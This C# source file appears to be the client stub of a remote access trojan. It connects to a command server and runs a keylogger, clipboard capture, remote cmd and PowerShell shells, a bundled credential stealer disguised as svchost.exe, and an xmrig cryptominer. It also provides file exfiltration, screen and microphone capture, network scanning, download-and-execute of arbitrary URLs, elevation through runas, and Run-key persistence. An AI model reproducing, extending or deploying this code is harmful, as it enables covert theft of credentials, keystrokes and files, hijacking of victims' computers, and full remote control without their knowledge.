using boulzar.Methods;
using boulzar.Methods.KG;
using boulzar.Netwokring;
using boulzar.Other;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Message = boulzar.Netwokring.Message;

namespace boulzar
{
    public partial class Program
    {
        #region Declarations
        public System.Threading.Timer timer1 = null;
        public System.Threading.Timer timer2 = null;
        private string Line = Environment.NewLine;
        //public MicrophonRec microClass = new MicrophonRec();
        private static int Port;
        private static string CurrentDir;

        public static bool FM_upload;
        public static string FM_path;
        // Stub stuff
        private string InstallPath;
        public static bool UpdateMode;
        private static string up_name;

        #endregion
        public static void Main()
        {
            System.Timers.Timer newTimer = new System.Timers.Timer();
            newTimer.Elapsed += new ElapsedEventHandler(Clipboard);
            newTimer.Interval = 5000;
            newTimer.Start();



            Task d = ConnectLoop();
            Klogger.Start(5000);

            Console.ReadLine();

        }


        #region  Connection 

        // When looping to look for Connection if the number of the filed connections is 5 then sleep for 5 min
        async static Task ConnectLoop()
        {

            Port = int.Parse(Csettings.Port);
            Networking.MainClient.Connect(Csettings.DNS, Port);
            while (!Networking.MainClient.Connected)
            {
                await Task.Delay(50);
                Networking.MainClient.Connect(Csettings.DNS, Port);

            }

            while (Networking.MainClient.Connected)
            {
                await Task.Delay(2000);

                GetData();
            }

            await ConnectLoop();
        }



        #endregion

        #region Data Handler
        private static void GetData()
        {

            Message Data;
            while (Networking.MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        Helpers.Send_NoCrypt(DataType.Clientinfo, Helpers.Getbytes(Information.BasicInfo()));
                        Client.isConnected = true;
                        break;

                    case EventType.Disconnected:
                        Client.isConnected = false;

                        break;

                    case EventType.Data:
                        HandleData(Data.data);
                        break;
                }
        }

        private static void HandleData(byte[] RawData)
        {
            MicrophonRec microClass = new MicrophonRec();

            string rawstr = Helpers.Getstrings(RawData);
            Console.WriteLine(rawstr);
            if (rawstr.StartsWith("PUB_Key449"))
            {

                rawstr = rawstr.Replace("PUB_Key449", "");
                rawstr = Helpers.DecompressString(rawstr);
                Console.WriteLine(rawstr);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.hw);
                byte[] d = Helpers.Getbytes(AES.EncryptString(HWID.Hwid_gen(), rawstr));
                ToSend.AddRange(d);
                Networking.MainClient.Send(ToSend.ToArray());
                ToSend.Clear();
                d = null;

            }
            else
            {
                rawstr = Convert.ToBase64String(RawData);
                rawstr = AES.StrDecrypt(rawstr);
            }
            //    
            if (FM_upload)
            {
                RawData = AES.Decrypt(RawData);
                Recivefile(FM_path, RawData);
            }
            if (UpdateMode)
            {
                RawData = AES.Decrypt(RawData);
                update(RawData);
            }

            #region Direct Command
            switch (rawstr)
            {

                case "Getinfo":

                    getinfo();
                    break;
                case "%startCmd%":
                    Declarations.shell = new cmd_shell();
                    break;
                case "%startPS%":
                    Declarations.PowerShell = new PowerShell();
                    break;
                case "cmdstop":
                    Declarations.shell.Dispose();
                    break;
                case "stopPS":
                    Declarations.PowerShell.Dispose();
                    break;
                case "GetClip":
                    clipti();
                    break;
                case "Getkeylog":
                    Kgit();
                    break;
                case "GetProcesses":
                    taskmgr.GetProcs();
                    break;
                case "FLMGR_SYSRES":
                    taskmgr.SysRes();
                    break;
                case "MINER":
                    min();
                    break;
                case "MINER_SYS":
                    mnr.m_sysinfo();
                    break;
                case "RaisePerms":
                    RaisePerms();
                    break;
                case "Disconnect":
                    Networking.MainClient.Disconnect();
                    break;
                case "ClientClose":
                    try
                    {
                        Environment.Exit(0);
                    }
                    catch
                    {

                    }
                    break;

                case "STLRrun":
                    stlr();
                    break;
                case "RDPINFO":
                    RDP.RDP_info();
                    break;



            }
            //Somhow opning the clipboard in the server crashes the Clients
            //Improve Commands Uniqnes as this might get thing fucked if other data contains same thing Use hashd version of the commands string keys


            #endregion
            #region Command with params
            if (rawstr.StartsWith("cmd|"))
            {
                Declarations.shell.ExecuteCommand(rawstr);
            }
            if (rawstr.StartsWith("PS|"))
            {
                Declarations.PowerShell.ExecuteCommand(rawstr);
            }
            if (rawstr.Contains("TAKEPIC"))
            {
                RDP.Handle_Capture(rawstr);
            }
            if (rawstr.Contains("FM"))
                filemgr(rawstr);
            else if (rawstr.Contains("killProc"))
                taskmgr.KillProc(rawstr);
            else if (rawstr.Contains("minne$r"))
                min_install(rawstr);
            else if (rawstr.Contains("FileReceiveUp"))
                Handelupdate(rawstr);
            else if (rawstr.StartsWith("Microphone"))

                microClass.HandleMicroRec(rawstr);
            else if (rawstr.StartsWith("Network"))
            Net(rawstr);
            else if (rawstr.StartsWith("Dwrun"))
                dwR(rawstr);
            #endregion
        }
        #endregion
        #region Network 
        private static void Net(string data)
        {
            string startIP = "";
            string EndIP = "";
            var t = new Thread(() => Networkz.Scanne(startIP, EndIP));

            if (data.Contains("NetworkScanneStart"))
            {
                try
                {

                    startIP = Helpers.GetSubstringByString("{", "}", data);
                    EndIP = Helpers.GetSubstringByString("<", ">", data);
                    t.Start();
                }

                catch (Exception ex)
                {
                    Helpers.SendError(ex);
                }
            }
            else if (data.Contains("NetworkScanneStop"))
            {
                if (t.IsAlive)
                {
                    t.Abort();
                }
            }

            if (data.Contains("GMG_Network"))
            {
                Networkz.Info();
            }


        }
        #endregion
        #region STLR
        private static void stlr()
        {
            try
            {
                string source = Properties.Resources.STLR;
                string stlPath = Path.GetTempPath() + @"\svchost.exe";
                Helpers.B64TOFILE(source, stlPath);
                Thread.Sleep(2000);
                Helpers.SendNotif("Stealer Has been started please wait....");
                var process = Process.Start(stlPath);
                process.WaitForExit();
                File.Delete(stlPath);
                List<byte> ToSendd = new List<byte>();
                ToSendd.Add((int)DataType.Stealer);
                ToSendd.AddRange(File.ReadAllBytes(Path.GetTempPath() + @"\2066-Zipped"));
                Networking.MainClient.Send(ToSendd.ToArray());
                ToSendd.Clear();
                Helpers.SendNotif("Stealer job done cheack for new files !!");
                File.Delete(Path.GetTempPath() + @"\2066-Zipped");
            }
            catch (Exception ex)
            {
                Helpers.SendError(ex);
            }
        }
        #endregion
        #region Update
        private static void Handelupdate(string data)
        {
            up_name = Helpers.GetSubstringByString("{", "}", data);
            UpdateMode = true;
        }
        private static void RaisePerms()
        {
            Process P = new Process();
            P.StartInfo.FileName = Application.ExecutablePath;
            P.StartInfo.UseShellExecute = true;
            P.StartInfo.Verb = "runas";
            P.Start();

            try
            {

                Process.GetCurrentProcess().Kill();
            }
            catch
            {
                Environment.Exit(0);
            }
        }
        #endregion
        #region Minner
        public static void min()
        {
            string data = mnr.m_info();
            Helpers.Send(DataType.miner, Helpers.Getbytes(data));

        }
        public static void min_install(string data)
        {
            string config_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows update\" + "config.json";

            if (data.Contains("minne$r_setup"))
            {

                string[] data_ = data.Split('~');
                mnr._lnk = data_[1];
                mnr.Mnr_type = data_[2];
                mnr.args = data_[3];
                mnr.wallet = data_[4];
                Thread li = new Thread(mnr.Load);
                li.Start();

            }


            if (data.Contains("minne$r_config"))
            {
                mnr.GetConfig();
            }

            else if (data.Contains("minne$r_newconfig"))
            {

                mnr.SetConfig(data);

            }
            else if (data.Contains("minne$r_start"))
            {
                if (File.Exists(mnr.exe_path))
                {

                    if (mnr.Cheackifruning() == false)
                    {
                        mnr.start(mnr.exe_path);

                        Helpers.SendNotif("The Minner has been started !");
                    }
                    else
                    {

                        Helpers.SendNotif("The Minner is already runing !");
                    }
                }
                else
                {
                    Helpers.SendNotif("The Minner is not installed !");
                }


            }
            else if (data.Contains("minne$r_stop"))
            {
                if (mnr.Cheackifruning() == true)
                {
                    Helpers.killproc("xmrig");
                    Helpers.SendNotif("The Minner has been Stoped !");
                }
            }
            else if (data.Contains("minne$r_cmd"))
            {
                try
                {
                    string data_cmd = mnr.cmddata;
                    Helpers.Send(DataType.miner_cmd, Helpers.Getbytes(data_cmd));
                }
                catch
                {
                }
            }
            else
            {

            }
        }
        #endregion
        #region Keylogger
        public static void Kgit()
        {
            Console.WriteLine("Line : 408 Logs have been requested from server ");


            string logs = Klogger.ReadLogs();
            if (logs.Length > 0)
            {
                Helpers.Send(DataType.keylogs, Helpers.Getbytes(Klogger.ReadLogs()));
                File.Delete(Klogger.loggerPath);
            }



        }

        #endregion


        #region clipboard
        public static void clipti()
        {
            string data = Tlipboard.GetCliped();
            Helpers.Send(DataType.clipboard, Helpers.Getbytes(data));
        }
        #endregion


        #region Filemanger
        public static void GetFiles(string dir)
        {
            string files = "";
            CurrentDir = dir;
            string filesize = string.Empty;
            DirectoryInfo DI = new DirectoryInfo(dir);

            foreach (var F in DI.GetDirectories())
                files += "*" + F.FullName + "*_" + "Directory" + "_-" + F.CreationTime + "-@" + "n" + "@";
            foreach (FileInfo F in DI.GetFiles())
            {
                filesize = Helpers.ToFileSize(F.Length);
                if (string.IsNullOrEmpty(F.Extension))
                {
                    files += "*" + Path.GetFileNameWithoutExtension(F.FullName) + "*_" + "  " + "_-" +
                                F.CreationTime + "-@" + filesize + "@";
                }
                files += "*" + Path.GetFileNameWithoutExtension(F.FullName) + "*_" + F.Extension + "_-" +
                F.CreationTime + "-@" + filesize + "@";

            }
            Helpers.Send(DataType.FilesList, Helpers.Getbytes(files));
            Helpers.Send(DataType.CurrentDirectory, Helpers.Getbytes(CurrentDir));



        }
        static string ToeditPath = "";
        public static void filemgr(string str)
        {
            try
            {
                Random r = new Random();
                string files = string.Empty;

                string dir = str;
                if (str.Contains("TMPIMG"))
                {
                    string filepath = str.Split('~')[1];
                    FileInfo flinfo = new FileInfo(filepath);

                    string compresionpath = Path.GetTempPath() + @"\" + r.Next(1000, 5000).ToString() + ".tmp";
                    Imager.PerformImageResizeAndPutOnCanvas(filepath, 264, 255, compresionpath);
                    Helpers.Send(DataType.tmpImg, File.ReadAllBytes(compresionpath));
                    Thread.Sleep(1000);
                    File.Delete(compresionpath);
                }
                if (str.Contains("GetFiles"))
                {
                    string FileL = Helpers.GetSubstringByString("{[", "]}", str);
                    string[] filelist = FileL.Split('~');
                    string Compresed = Path.GetTempPath() + @"\" + r.Next(1000, 5000).ToString() + ".tmp";
                    Helpers.CreateZipFile(Compresed, filelist);
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(Compresed, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }
                    Helpers.Send(DataType.FileDw, FileBytes);

                    File.Delete(Compresed);
                    Helpers.SendNotif("Downloading of the files  is done !");
                }
                if (dir.Contains("DRV"))
                {


                    foreach (DriveInfo Drive in DriveInfo.GetDrives())
                    {
                        if (Drive.DriveType != DriveType.CDRom)
                        {


                            files += "*" + Drive.RootDirectory.ToString() + "*_" + Drive.DriveType.ToString() + "_" +
                                "-" + Helpers.ToFileSize(Drive.AvailableFreeSpace) + " Out Of " + Helpers.ToFileSize(Drive.TotalSize) + "-";
                        }
                        else
                        {
                            files += "*" + Drive.RootDirectory.ToString() + "*_" + Drive.DriveType.ToString() + "_" +
                                "-" + "NULL" + "-";
                        }
                    }

                    Helpers.Send(DataType.DriveList, Helpers.Getbytes(files));


                }

                else
                {
                    if (str.Contains("GoUpDir"))
                    {
                        CurrentDir = Directory.GetParent(CurrentDir).ToString();
                        GetFiles(CurrentDir);

                    }
                    if (dir.Contains("FMGetDF"))
                    {
                        dir = Helpers.GetSubstringByString("{", "}", dir);
                        GetFiles(dir);

                    }
                    if (dir.Contains("FMDelete"))
                    {
                        string[] filetodelete = Helpers.GetSubstringByString("{", "}", str).Split('~');
                        foreach (string s in filetodelete)
                        {
                            if (string.IsNullOrEmpty(s))
                                continue;
                            Console.WriteLine(s);
                            System.IO.File.Delete(s);


                        }


                    }
                    if (dir.Contains("FMRename"))
                    {

                        string path = Helpers.GetSubstringByString("{", "}", str);
                        string nwname = Helpers.GetSubstringByString("<", ">", str);
                        File.Move(path, nwname);


                    }
                    if (dir.Contains("FMHIDE"))
                    {
                        string path = Helpers.GetSubstringByString("{", "}", str);
                        File.SetAttributes(path, FileAttributes.Hidden);
                    }
                    if (dir.Contains("FMSHOW"))
                    {
                        string path = Helpers.GetSubstringByString("{", "}", str);
                        File.SetAttributes(path, FileAttributes.Normal);
                    }
                    if (dir.Contains("FMStartFileReceive"))
                    {
                        FM_upload = true;
                        FM_path = Helpers.GetSubstringByString("{", "}", dir);
                    }
                    if (dir.Contains("FMOpen"))
                    {
                        string path = Helpers.GetSubstringByString("{", "}", dir);
                        openfile(path, "");
                    }
                    if (dir.Contains("FMOpenhiden"))
                    {
                        string path = Helpers.GetSubstringByString("{", "}", dir);
                        openfile(path, "Hiden");
                    }
                    if (dir.Contains("FMSpecial"))
                    {
                        if (dir.Contains("1"))
                            GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
                        if (dir.Contains("2"))
                            GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                        if (dir.Contains("3"))
                            GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                        if (dir.Contains("4"))
                            GetFiles(Path.GetTempPath());

                    }
                    if (dir.Contains("FMNeW"))
                    {
                        if (dir.Contains("Fldr"))
                        {
                            string[] strs = dir.Split('~');
                            Directory.CreateDirectory(CurrentDir + @"\" + strs[1]);
                            Helpers.Send(DataType.Notif, Helpers.Getbytes("The Folder " + strs[1] + " Has been created in " + CurrentDir));
                        }
                        if (dir.Contains("filouz"))
                        {
                            string[] strs = dir.Split('~');
                            var Stream = File.Create(CurrentDir + @"\" + strs[1]);
                            Stream.Close();
                            Helpers.Send(DataType.Notif, Helpers.Getbytes("The File " + strs[1] + " Has been created in " + CurrentDir));
                        }

                    }

                    if (dir.Contains("FMEditeez"))
                    {
                        if (dir.Contains("gemedatfileboi"))
                        {
                            string[] strs = dir.Split('~');
                            string filepath = strs[1];

                            ToeditPath = filepath;
                            string filedata = File.ReadAllText(filepath);
                            if (string.IsNullOrEmpty(filedata))
                                filedata = "This File is empty";
                            Helpers.Send(DataType.editdata, Helpers.Getbytes(filedata));
                        }
                        if (dir.Contains("hereyougoboi"))
                        {
                            string[] strs = dir.Split('~');
                            File.WriteAllText(ToeditPath, strs[1]);
                            ToeditPath = "";
                        }

                    }

                }

            }
            catch (Exception ex)
            {
                Helpers.SendError(ex);
            }


        }

        public static void openfile(string path, string mode)
        {
            try
            {


                if (mode == "Hiden")
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = path;
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);

                }
                else
                {
                    Process.Start(path);
                }
                Helpers.SendNotif("The file >>> " + Path.GetFileName(path) + " has been started succefully !");
            }
            catch (Exception ex)
            {
                Helpers.SendError(ex);
            }
        }
        public static void Recivefile(string path, Byte[] data)
        {
            try
            {
                File.WriteAllBytes(path, data);
                Helpers.SendNotif("The file >>>> " + Path.GetFileName(path) + "has been uploaded !");
                FM_upload = false;
                FM_path = string.Empty;
            }
            catch (Exception ex)
            {
                Helpers.SendError(ex);
            }
        }
        #endregion
        #region Installation & Update
        private void home()
        {
            InstallPath = Csettings.GetinstalleP() + @"\" + Csettings.ApplicationName;
            RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
            RK.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), InstallPath);
        }
        private static void update(byte[] file)
        {
            string fpath = "";
            if (Csettings.install_path == "%appdata%")
                fpath = Csettings.GetinstalleP() + @"\" + up_name;
            else
                fpath = Csettings.GetinstalleP() + @"\" + up_name;


            if (File.Exists(fpath))
            {
                try
                {
                    File.Delete(fpath);
                }

                catch
                {

                }
            }

            try
            {
                File.WriteAllBytes(fpath, file);
                Process.Start(fpath);
                File.SetAttributes(fpath, FileAttributes.Hidden);
                Suicide();
                UpdateMode = false;
            }
            catch
            {
            }

        }
        private static void Suicide()
        {
            try
            {
                Process.GetCurrentProcess().Kill();
            }
            catch
            {
                Environment.Exit(0);
            }
        }
        #endregion
        #region Miscs

        public static void dwR(string url)
        {
            try
            {
                string dw_url = url.Split('|')[1];
                Uri uri = new Uri(dw_url);
              
                string filename = System.IO.Path.GetFileName(uri.LocalPath);
                
                Helpers.Dw(dw_url, Path.GetTempPath() + @"\" + filename);
                Process.Start(Path.GetTempPath() + @"\" + filename);
                Helpers.SendNotif("File '" + filename + "' Has been downloaded and started !");
            }
            catch (Exception e)
            {
                Helpers.SendError(e);
            }
           
           
            

        }

        #endregion
        public static void getinfo()
        {
            try
            {
                string data = Information.ShowSystemInformation();
                Helpers.Send(DataType.information, Helpers.Getbytes(data));
            }
            catch (Exception ex)
            {
                Helpers.SendError(ex);
            }
        }
        // [STAThread]


        int lastpos;
        int currntpos;
        public static bool idle;
        /*    public bool isIDL()
            {
                currntpos = MousePosition.X + MousePosition.Y;
                if (currntpos == lastpos)

                    return true;
                else
                    lastpos = currntpos;
                return false;

            }
        */
        public static void Clipboard(object source, ElapsedEventArgs e)
        {
            Tlipboard.clipit();
        }

    }
}
